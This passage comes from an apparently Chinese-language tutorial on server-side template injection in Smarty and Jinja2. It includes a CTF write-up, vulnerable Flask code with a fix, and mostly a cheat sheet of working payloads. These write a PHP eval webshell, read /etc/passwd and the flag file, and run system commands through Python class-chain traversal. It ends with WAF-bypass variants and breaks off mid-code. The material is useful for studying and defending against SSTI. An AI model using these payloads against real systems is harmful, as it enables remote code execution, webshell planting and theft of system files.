class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function clearConfig($varname &#x3D; null)</span><br><span class="line">&#123;</span><br><span class="line">    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们可以构造payload写个webshell</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php eval($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure><h3 id="CTF实例讲解"><a href="#CTF实例讲解" class="headerlink" title="CTF实例讲解"></a>CTF实例讲解</h3><p>CTF地址：<a href="https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）">https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）</a></p><p>题目模拟了一个获取IP的API，并且可以在最下方看到 “Build With Smarty !” 可以确定页面使用的是Smarty模板引擎。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208093133128.png" alt="image-20220208093133128"></p><p>在页面的右上角发现了IP，题目中提供的API均无法访问，猜测这个IP受到X-Forwarded-For头控制。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208093254678.png" alt="image-20220208093254678"></p><p>修改XXF头发现值发生变化</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208094103720.png" alt="image-20220208094103720"></p><p>直接构造{system(‘cat /flag’)}即可得到flag</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208094226601.png" alt="image-20220208094226601"></p><p>本题中引发SSTI的代码简化后如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    require_once(&#39;.&#x2F;smarty&#x2F;libs&#x2F;&#39; . &#39;Smarty.class.php&#39;);</span><br><span class="line">    $smarty &#x3D; new Smarty();</span><br><span class="line">    $ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];</span><br><span class="line">    $smarty-&gt;display(&quot;string:&quot;.$ip);     &#x2F;&#x2F; display函数把标签替换成对象的php变量；显示模板</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。</p><h3 id="Smarty-SSTI常规利用方式"><a href="#Smarty-SSTI常规利用方式" class="headerlink" title="Smarty-SSTI常规利用方式"></a>Smarty-SSTI常规利用方式</h3><h4 id="smarty-version"><a href="#smarty-version" class="headerlink" title="{$smarty.version}"></a>{$smarty.version}</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;    #获取smarty的版本号</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208094843016.png" alt="image-20220208094843016"></p><h4 id="php-php"><a href="#php-php" class="headerlink" title="{php}{/php}"></a>{php}{/php}</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;php&#125;phpinfo();&#123;&#x2F;php&#125;  #执行相应的php代码</span><br></pre></td></tr></table></figure><p>Smarty支持使用 {php}{/php} 标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{/php}标签会报错：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095011038.png" alt="image-20220208095011038"></p><p>因为在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用</p><h4 id="literal"><a href="#literal" class="headerlink" title="{literal}"></a>{literal}</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;   </span><br></pre></td></tr></table></figure><p>这个地方借助了 {literal} 这个标签，因为 {literal} 可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。但是这种写法只适用于php5环境，这道ctf使用的是php7，所以依然失败</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095233169.png" alt="image-20220208095233169"></p><h4 id="getstreamvariable"><a href="#getstreamvariable" class="headerlink" title="getstreamvariable"></a>getstreamvariable</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法。然而使用这个payload会触发报错如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095627806.png" alt="image-20220208095627806"></p><p>可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。 对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p><p>5.{if}{/if}</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure><p>Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||<em>，or，&amp;&amp;，and，is_array()等等，如：{if is_array($array)}{/if}</em></p><p>既然这样就将XFF头改为 {if phpinfo()}{/if} ：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095833547.png" alt="image-20220208095833547"></p><p>同样还能用来执行一些系统命令：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095933513.png" alt="image-20220208095933513"></p><h2 id="Blade"><a href="#Blade" class="headerlink" title="Blade"></a>Blade</h2><p>Blade 是 Laravel 提供的一个既简单又强大的模板引擎。</p><p>关于blade模板这里不再多说，请参考《<a href="https://www.cnblogs.com/sgm4231/p/10283661.html">laravel Blade 模板引擎</a>》</p><h1 id="Python中的SSTI"><a href="#Python中的SSTI" class="headerlink" title="Python中的SSTI"></a>Python中的SSTI</h1><p>python中常见的模版有: Jinja2, tornado</p><h2 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h2><p>Jinja2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的</p><p>Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了  块</p><p>Jinja2使用 结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。</p><p>Jinja2 模板同样支持控制语句，像在 &#123;%…%&#125; 块中，下面举一个常见的使用Jinja2模板引擎for语句循环渲染一组元素的例子：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">     &#123;% for comment in comments %&#125;</span><br><span class="line">         &lt;li&gt;&#123;&#123;comment&#125;&#125;&lt;&#x2F;li&gt;</span><br><span class="line">     &#123;% endfor %&#125;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br></pre></td></tr></table></figure><p>另外Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello, &#123;&#123;name|capitalize&#125;&#125;</span><br></pre></td></tr></table></figure><p>我们使用vulhub提供的环境进行复现，搭建成功后访问首页如图</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208181230660.png" alt="image-20220208181230660"></p><p>进入Docker容器来看一下对应的代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">from jinja2 import Template</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;&quot;)</span><br><span class="line">def index():</span><br><span class="line">    name &#x3D; request.args.get(&#39;name&#39;, &#39;guest&#39;)</span><br><span class="line"></span><br><span class="line">    t &#x3D; Template(&quot;Hello &quot; + name)</span><br><span class="line">    return t.render()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>t = Template(“hello” + name)这行代码表示，将前段输入的name拼接到模版，此时name的输入没有进过任何检测，尝试使用模版语言测试：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208181449567.png" alt="image-20220208181449567"></p><p>如果使用了一个固定好了的模版，在模版渲染之后传入数据，就不存在模板注入，就好像SQL注入的预编译一样，修复上面代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">from jinja2 import Template</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;&quot;)</span><br><span class="line">def index():</span><br><span class="line">    name &#x3D; request.args.get(&#39;name&#39;, &#39;guest&#39;)</span><br><span class="line"></span><br><span class="line">    t &#x3D; Template(&quot;Hello &#123;&#123;n&#125;&#125;&quot;)</span><br><span class="line">    return t.render(n&#x3D;name)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>编译运行，再次注入就会失败</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208183412224.png" alt="image-20220208183412224"></p><p>由于在jinja2中是可以直接访问python的一些对象及其方法的，所以可以通过构造继承链来执行一些操作，比如文件读取，命令执行等：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__dict__　　 ：保存类实例或对象实例的属性变量键值对字典</span><br><span class="line">__class__　　：返回一个实例所属的类</span><br><span class="line">__mro__　　  ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）__base__　　 ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组</span><br><span class="line">&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的</span><br><span class="line">__subclasses__　　：以列表返回类的子类</span><br><span class="line">__init__　　 ：类的初始化方法</span><br><span class="line">__globals__　　   ：对包含函数全局变量的字典的引用__builtin__&amp;&amp;__builtins__　　：python中可以直接运行一些函数，例如int()，list()等等。　　　　　　　　　　　　　　　　　　这些函数可以在__builtin__可以查到。查看的方法是dir(__builtins__)　　　　　　　　　　　　　　　　　　在py3中__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="用file对象来读取文件"><a href="#用file对象来读取文件" class="headerlink" title="用file对象来读取文件"></a>用file对象来读取文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for c in &#123;&#125;.__class__.__base__.__subclasses__():</span><br><span class="line">    if(c.__name__&#x3D;&#x3D;&#39;file&#39;):</span><br><span class="line">        print(c)</span><br><span class="line">        print c(&#39;ol4three.txt&#39;).readlines()</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python ssti.py</span><br><span class="line">&lt;type &#39;file&#39;&gt;</span><br><span class="line">[&#39;hello ol4three ~&#39;]</span><br></pre></td></tr></table></figure><p>上述代码先通过<strong>class</strong>获取字典对象所属的类，再通过<strong>base</strong>（<strong>bases[0]</strong>）拿到基类，然后使用<strong>subclasses</strong>()获取子类列表，在子类列表中直接寻找可以利用的类</p><p>为了方便理解，我直接把获取到的子类列表打印出来：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for c in &#123;&#125;.__class__.__base__.__subclasses__():</span><br><span class="line">        print(c) </span><br></pre></td></tr></table></figure><p>打印结果如下（python2.7.18）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;type &#39;type&#39;&gt;</span><br><span class="line">&lt;type &#39;weakref&#39;&gt;</span><br><span class="line">&lt;type &#39;weakcallableproxy&#39;&gt;</span><br><span class="line">&lt;type &#39;weakproxy&#39;&gt;</span><br><span class="line">&lt;type &#39;int&#39;&gt;</span><br><span class="line">&lt;type &#39;basestring&#39;&gt;</span><br><span class="line">&lt;type &#39;bytearray&#39;&gt;</span><br><span class="line">&lt;type &#39;list&#39;&gt;</span><br><span class="line">&lt;type &#39;NoneType&#39;&gt;</span><br><span class="line">&lt;type &#39;NotImplementedType&#39;&gt;</span><br><span class="line">&lt;type &#39;traceback&#39;&gt;</span><br><span class="line">&lt;type &#39;super&#39;&gt;</span><br><span class="line">&lt;type &#39;xrange&#39;&gt;</span><br><span class="line">&lt;type &#39;dict&#39;&gt;</span><br><span class="line">&lt;type &#39;set&#39;&gt;</span><br><span class="line">&lt;type &#39;slice&#39;&gt;</span><br><span class="line">&lt;type &#39;staticmethod&#39;&gt;</span><br><span class="line">&lt;type &#39;complex&#39;&gt;</span><br><span class="line">&lt;type &#39;float&#39;&gt;</span><br><span class="line">&lt;type &#39;buffer&#39;&gt;</span><br><span class="line">&lt;type &#39;long&#39;&gt;</span><br><span class="line">&lt;type &#39;frozenset&#39;&gt;</span><br><span class="line">&lt;type &#39;property&#39;&gt;</span><br><span class="line">&lt;type &#39;memoryview&#39;&gt;</span><br><span class="line">&lt;type &#39;tuple&#39;&gt;</span><br><span class="line">&lt;type &#39;enumerate&#39;&gt;</span><br><span class="line">&lt;type &#39;reversed&#39;&gt;</span><br><span class="line">&lt;type &#39;code&#39;&gt;</span><br><span class="line">&lt;type &#39;frame&#39;&gt;</span><br><span class="line">&lt;type &#39;builtin_function_or_method&#39;&gt;</span><br><span class="line">&lt;type &#39;instancemethod&#39;&gt;</span><br><span class="line">&lt;type &#39;function&#39;&gt;</span><br><span class="line">&lt;type &#39;classobj&#39;&gt;</span><br><span class="line">&lt;type &#39;dictproxy&#39;&gt;</span><br><span class="line">&lt;type &#39;generator&#39;&gt;</span><br><span class="line">&lt;type &#39;getset_descriptor&#39;&gt;</span><br><span class="line">&lt;type &#39;wrapper_descriptor&#39;&gt;</span><br><span class="line">&lt;type &#39;instance&#39;&gt;</span><br><span class="line">&lt;type &#39;ellipsis&#39;&gt;</span><br><span class="line">&lt;type &#39;member_descriptor&#39;&gt;</span><br><span class="line">&lt;type &#39;file&#39;&gt;</span><br><span class="line">&lt;type &#39;PyCapsule&#39;&gt;</span><br><span class="line">&lt;type &#39;cell&#39;&gt;</span><br><span class="line">&lt;type &#39;callable-iterator&#39;&gt;</span><br><span class="line">&lt;type &#39;iterator&#39;&gt;</span><br><span class="line">&lt;type &#39;sys.long_info&#39;&gt;</span><br><span class="line">&lt;type &#39;sys.float_info&#39;&gt;</span><br><span class="line">&lt;type &#39;EncodingMap&#39;&gt;</span><br><span class="line">&lt;type &#39;fieldnameiterator&#39;&gt;</span><br><span class="line">&lt;type &#39;formatteriterator&#39;&gt;</span><br><span class="line">&lt;type &#39;sys.version_info&#39;&gt;</span><br><span class="line">&lt;type &#39;sys.flags&#39;&gt;</span><br><span class="line">&lt;type &#39;exceptions.BaseException&#39;&gt;</span><br><span class="line">&lt;type &#39;module&#39;&gt;</span><br><span class="line">&lt;type &#39;imp.NullImporter&#39;&gt;</span><br><span class="line">&lt;type &#39;zipimport.zipimporter&#39;&gt;</span><br><span class="line">&lt;type &#39;posix.stat_result&#39;&gt;</span><br><span class="line">&lt;type &#39;posix.statvfs_result&#39;&gt;</span><br><span class="line">&lt;class &#39;warnings.WarningMessage&#39;&gt;</span><br><span class="line">&lt;class &#39;warnings.catch_warnings&#39;&gt;</span><br><span class="line">&lt;class &#39;_weakrefset._IterationGuard&#39;&gt;</span><br><span class="line">&lt;class &#39;_weakrefset.WeakSet&#39;&gt;</span><br><span class="line">&lt;class &#39;_abcoll.Hashable&#39;&gt;</span><br><span class="line">&lt;type &#39;classmethod&#39;&gt;</span><br><span class="line">&lt;class &#39;_abcoll.Iterable&#39;&gt;</span><br><span class="line">&lt;class &#39;_abcoll.Sized&#39;&gt;</span><br><span class="line">&lt;class &#39;_abcoll.Container&#39;&gt;</span><br><span class="line">&lt;class &#39;_abcoll.Callable&#39;&gt;</span><br><span class="line">&lt;type &#39;dict_keys&#39;&gt;</span><br><span class="line">&lt;type &#39;dict_items&#39;&gt;</span><br><span class="line">&lt;type &#39;dict_values&#39;&gt;</span><br><span class="line">&lt;class &#39;site._Printer&#39;&gt;</span><br><span class="line">&lt;class &#39;site._Helper&#39;&gt;</span><br><span class="line">&lt;type &#39;_sre.SRE_Pattern&#39;&gt;</span><br><span class="line">&lt;type &#39;_sre.SRE_Match&#39;&gt;</span><br><span class="line">&lt;type &#39;_sre.SRE_Scanner&#39;&gt;</span><br><span class="line">&lt;class &#39;site.Quitter&#39;&gt;</span><br><span class="line">&lt;class &#39;codecs.IncrementalEncoder&#39;&gt;</span><br><span class="line">&lt;class &#39;codecs.IncrementalDecoder&#39;&gt;</span><br></pre></td></tr></table></figure><p>使用dir来看一下file这个子类的内置方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir(().__class__.__bases__[0].__subclasses__()[40])</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;__class__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__enter__&#39;, &#39;__exit__&#39;, &#39;__format__&#39;, &#39;__getattribute__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__iter__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;close&#39;, &#39;closed&#39;, &#39;encoding&#39;, &#39;errors&#39;, &#39;fileno&#39;, &#39;flush&#39;, &#39;isatty&#39;, &#39;mode&#39;, &#39;name&#39;, &#39;newlines&#39;, &#39;next&#39;, &#39;read&#39;, &#39;readinto&#39;, &#39;readline&#39;, &#39;readlines&#39;, &#39;seek&#39;, &#39;softspace&#39;, &#39;tell&#39;, &#39;truncate&#39;, &#39;write&#39;, &#39;writelines&#39;, &#39;xreadlines&#39;]</span><br></pre></td></tr></table></figure><p>将读取的文件传入并使用readlines()方法读取，就相当于：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file(&#39;ol4three.txt&#39;).readlines()</span><br></pre></td></tr></table></figure><p>我们在使用jinja2的语法封装成可解析的样子：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__&#x3D;&#x3D;&#39;file&#39; %&#125;</span><br><span class="line">&#123;&#123; print(c(&quot;&#x2F;etc&#x2F;passwd&quot;).readlines()) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209153255402.png" alt="image-20220209153255402"></p><p>会发现没有读取成功，原因是：<strong>python3已经移除了file。所以利用file子类文件读取只能在python2中用。</strong></p><p>docker容器默认使用python3版本我们使用python2在进行查看发现已经成功执行命令</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209153646329.png" alt="image-20220209153646329"></p><h3 id="使用内置模块执行命令"><a href="#使用内置模块执行命令" class="headerlink" title="使用内置模块执行命令"></a>使用内置模块执行命令</h3><p>上面的实例中我们使用dir把内置的对象列举出来，其实可以用<strong>globals</strong>更深入的去看每个类可以调用的东西（包括模块，类，变量等等），如果有os这种可以直接传入命令，造成命令执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">search &#x3D; &#39;os&#39;   #也可以是其他你想利用的模块</span><br><span class="line">num &#x3D; -1</span><br><span class="line">for i in ().__class__.__bases__[0].__subclasses__():</span><br><span class="line">    num +&#x3D; 1</span><br><span class="line">    try:</span><br><span class="line">        if search in i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    except:</span><br><span class="line">        pass </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python ssti.py</span><br><span class="line">(&lt;class &#39;site._Printer&#39;&gt;, 71)</span><br><span class="line">(&lt;class &#39;site.Quitter&#39;&gt;, 76)</span><br></pre></td></tr></table></figure><p>我们可以看到在元组68，73的位置找到了os方法，这样就可以构造命令执行payload:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[68].__init__.__globals__[&#39;os&#39;].system(&#39;whoami&#39;)</span><br><span class="line">().__class__.__base__.__subclasses__()[73].__init__.__globals__[&#39;os&#39;].system(&#39;whoami&#39;)</span><br><span class="line">().__class__.__mro__[1].__subclasses__()[68].__init__.__globals__[&#39;os&#39;].system(&#39;whoami&#39;)</span><br><span class="line">().__class__.__mro__[1].__subclasses__()[73].__init__.__globals__[&#39;os&#39;].system(&#39;whoami&#39;)</span><br></pre></td></tr></table></figure><p>不过同样，只能在python2版本中使用</p><p>这时候就要推荐<strong>builtins</strong>:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">search &#x3D; &#39;__builtins__&#39;</span><br><span class="line">num &#x3D; -1</span><br><span class="line">for i in ().__class__.__bases__[0].__subclasses__():</span><br><span class="line">    num +&#x3D; 1</span><br><span class="line">    try:</span><br><span class="line">        #print(i.__init__.__globals__.keys())</span><br><span class="line">        if search in i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&lt;class &#39;warnings.WarningMessage&#39;&gt;, 58)</span><br><span class="line">(&lt;class &#39;warnings.catch_warnings&#39;&gt;, 59)</span><br><span class="line">(&lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, 60)</span><br><span class="line">(&lt;class &#39;_weakrefset.WeakSet&#39;&gt;, 61)</span><br><span class="line">(&lt;class &#39;site._Printer&#39;&gt;, 71)</span><br><span class="line">(&lt;class &#39;site.Quitter&#39;&gt;, 76)</span><br><span class="line">(&lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, 77)</span><br><span class="line">(&lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, 78)</span><br></pre></td></tr></table></figure><p>这时候我们的命令执行payload就出来了：</p><p>python3:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</span><br></pre></td></tr></table></figure><p>python2:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</span><br></pre></td></tr></table></figure><p>实际效果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&quot;) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220209161439230.png" alt="image-20220209161439230"></p><h3 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获得基类</span><br><span class="line">#python2.7</span><br><span class="line">&#39;&#39;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br><span class="line">#python3.7</span><br><span class="line">&#39;&#39;.__。。。class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br><span class="line"></span><br><span class="line">#python 2.7</span><br><span class="line">#文件操作</span><br><span class="line">#找到file类</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line">#读文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">#写文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;tmp&#39;).write(&#39;test&#39;)</span><br><span class="line"></span><br><span class="line">#命令执行</span><br><span class="line">#os执行</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;id&#39;).read()</span><br><span class="line">#eval,impoer等全局函数</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()</span><br><span class="line"></span><br><span class="line">#python3.7</span><br><span class="line">#命令执行</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#文件操作</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#windows下的os命令</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="一些绕过waf的姿势"><a href="#一些绕过waf的姿势" class="headerlink" title="一些绕过waf的姿势"></a>一些绕过waf的姿势</h3><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤["></a>过滤[</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#getitem、pop</span><br><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a><strong>过滤引号</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#chr函数</span><br><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()&#125;&#125;#request对象</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line">#命令执行</span><br><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span 